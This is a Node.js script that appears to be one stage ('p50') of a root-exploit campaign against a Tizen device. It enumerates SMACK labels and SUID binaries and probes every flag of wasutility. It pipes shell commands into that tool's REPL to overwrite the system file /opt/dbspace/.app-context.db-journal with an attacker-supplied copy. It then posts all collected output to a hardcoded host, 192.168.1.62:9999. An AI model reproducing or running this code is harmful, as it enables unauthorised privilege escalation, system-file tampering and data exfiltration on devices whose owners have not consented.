"use strict";

/* p50: root-vector deep dive
   1. SMACK labels (ls -Z) on every relevant path  -> understand the MAC model
   2. TTY tool availability (script/expect/setsid/unshare)
   3. wasutility REAL flag battery (node parent), each with an observable effect:
      -w -v -p -t -c -n -s -f -u -g<dir> -d<dir> -a -e<dir>
      (create /tmp dirs first; -e should remove one; -p should print; etc.)
   4. wasutility REPL via PTY (script) + via pipe, capturing full output
   5. RunningAppsService (SUID+SGID root): file/strings/run/behavior
   6. dotnet-launcher: capability probe + usage
   exfil /p50info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var SRC = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var R = { ts: new Date().toISOString(), probe: 'p50', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p50info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 6000);
  }
}

function runDirect(file, args, input, timeoutMs) {
  try {
    var opt = { timeout: timeoutMs || 10000, maxBuffer: 8 * 1024 * 1024 };
    if (input !== undefined) opt.input = input;
    var r = cp.spawnSync(file, args, opt);
    var out = '';
    if (r.stdout) out += 'OUT: ' + r.stdout.toString();
    if (r.stderr) out += ' ERR: ' + r.stderr.toString();
    out += ' [exit ' + (r.status === null ? 'null' : r.status) + ']';
    if (r.error) out += ' [spawnErr ' + r.error.message + ']';
    return out.substring(0, 8000);
  } catch (e) { return 'ERR ' + e.message; }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) SMACK labels
  R.results.smack = run(
    'echo ===Z===; ' +
    'ls -Z /usr/bin/node 2>&1; ' +
    'ls -Z /tmp/p49ps/org.tizen.webappservice/bin/webappservice 2>&1; ' +
    'ls -Z /usr/bin/wasutility 2>&1; ' +
    'ls -Z /usr/bin/RunningAppsService 2>&1; ' +
    'ls -Z /usr/bin/dotnet-launcher 2>&1; ' +
    'ls -Z /usr/bin 2>&1; ' +
    'ls -Z /tmp 2>&1; ' +
    'ls -Z /opt 2>&1; ' +
    'ls -Z /opt/dbspace 2>&1; ' +
    'ls -Z /opt/dbspace/.app-context.db 2>&1; ' +
    'ls -Z /opt/dbspace/.app-context.db-journal 2>&1; ' +
    'ls -Z /opt/usr/apps/webappservice 2>&1; ' +
    'ls -Z ' + SRC + ' 2>&1; ' +
    'ls -Z /home/owner 2>&1', 30000
  );

  // 2) TTY tools
  R.results.tty_tools = run(
    'echo ===WHICH===; which script expect setsid unshare pty 2>&1; ' +
    'echo ===LS===; ls /usr/bin /bin /usr/sbin /sbin 2>/dev/null | grep -iE "script|expect|pty|setsid|unshare"; ' +
    'echo ===SCRIPT_HELP===; script --help 2>&1 | head -20', 20000
  );

  // 3) wasutility REAL flag battery (node parent), observable effects
  R.results.setup_dirs = run('rm -rf /tmp/p50_e /tmp/p50_g /tmp/p50_d; mkdir -p /tmp/p50_e /tmp/p50_g /tmp/p50_d; ls -la /tmp/p50_e /tmp/p50_g /tmp/p50_d 2>&1', 10000);

  R.results.wu_w = runDirect('/usr/bin/wasutility', ['-w'], undefined, 8000);
  R.results.wu_v = runDirect('/usr/bin/wasutility', ['-v'], undefined, 8000);
  R.results.wu_p = runDirect('/usr/bin/wasutility', ['-p'], undefined, 8000);
  R.results.wu_t = runDirect('/usr/bin/wasutility', ['-t'], undefined, 10000);
  R.results.wu_c = runDirect('/usr/bin/wasutility', ['-c'], undefined, 10000);
  R.results.wu_n = runDirect('/usr/bin/wasutility', ['-n'], undefined, 10000);
  R.results.wu_s = runDirect('/usr/bin/wasutility', ['-s'], undefined, 10000);
  R.results.wu_f = runDirect('/usr/bin/wasutility', ['-f'], undefined, 8000);
  R.results.wu_u = runDirect('/usr/bin/wasutility', ['-u'], undefined, 8000);
  R.results.wu_g = runDirect('/usr/bin/wasutility', ['-g', '/tmp/p50_g'], undefined, 8000);
  R.results.wu_d = runDirect('/usr/bin/wasutility', ['-d', '/tmp/p50_d'], undefined, 8000);
  R.results.wu_a = runDirect('/usr/bin/wasutility', ['-a', 'xvvl3S1bvH'], undefined, 8000);
  R.results.wu_e = runDirect('/usr/bin/wasutility', ['-e', '/tmp/p50_e'], undefined, 8000);

  R.results.wu_effects = run('echo ===AFTER===; ls -la /tmp/p50_e /tmp/p50_g /tmp/p50_d 2>&1; echo ===WASDB===; ls -la /opt/dbspace/.webappservice.db* 2>&1; md5sum /opt/dbspace/.webappservice.db 2>&1; echo ===JRN===; md5sum ' + DST + ' 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  // 4) wasutility REPL via PTY (script) + via pipe
  var repl = ['help', '?', 'id', 'whoami', 'touch /tmp/p50_repl_marker', 'cp ' + SRC + ' ' + DST, 'md5sum ' + DST, 'ls -la ' + DST, 'quit', 'exit'].join('\n') + '\n';
  R.results.repl_pipe = runDirect('/usr/bin/wasutility', [], repl, 18000);
  var printfArg = repl.replace(/\n/g, '\\n');
  R.results.repl_pty = run('rm -f /tmp/p50_pty_out.txt; printf ' + "'" + printfArg + "'" + ' | script -q /tmp/p50_pty_out.txt -c /usr/bin/wasutility 2>&1; echo PTY_exit=$?; echo ===PTY_OUT===; cat /tmp/p50_pty_out.txt 2>&1', 25000);
  R.results.repl_verify = run('echo ===MARKER===; ls -la /tmp/p50_repl_marker 2>&1; echo ===JRN===; md5sum ' + DST + ' 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1', 15000);

  // 5) RunningAppsService
  R.results.ras_file = run('file /usr/bin/RunningAppsService 2>&1; echo ===LS===; ls -laZ /usr/bin/RunningAppsService 2>&1; echo ===SIZE===; du -h /usr/bin/RunningAppsService 2>&1', 15000);
  R.results.ras_strings = run('strings /usr/bin/RunningAppsService 2>/dev/null | grep -iE "app-context|dbspace|journal|/opt/|/home/|owner|root|was|context|\.db|journal|exec|system|popen|/bin/" | head -60; echo ===ALLHEAD===; strings /usr/bin/RunningAppsService 2>/dev/null | head -40', 20000);
  R.results.ras_run = run('rm -f /tmp/p50_ras_marker; /usr/bin/RunningAppsService 2>&1 | head -30; echo RAS_exit=$?; echo ===ARG===; /usr/bin/RunningAppsService -h 2>&1 | head -30; echo RASh_exit=$?; echo ===TOUCH_TEST===; ls -la /tmp/p50_ras_marker 2>&1', 20000);

  // 6) dotnet-launcher capability probe
  R.results.dotnet2 = run(
    'echo ===LSZ===; ls -laZ /usr/bin/dotnet-launcher 2>&1; ' +
    'echo ===CAPXATTR_TRY===; cat /usr/bin/dotnet-launcher > /dev/null 2>&1; echo read_ok=$?; ' +
    'echo ===RUN_VERB===; /usr/bin/dotnet-launcher --help 2>&1 | head -20; echo V_exit=$?; ' +
    'echo ===RUN_APP===; /usr/bin/dotnet-launcher /nonexistent.dll 2>&1 | head -10; echo A_exit=$?; ' +
    'echo ===DOTNET_DIRS===; ls -la /usr/lib/dotnet 2>&1; ls -la /usr/share/dotnet 2>&1; ls -la /opt/usr/dotnet 2>&1', 20000
  );

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
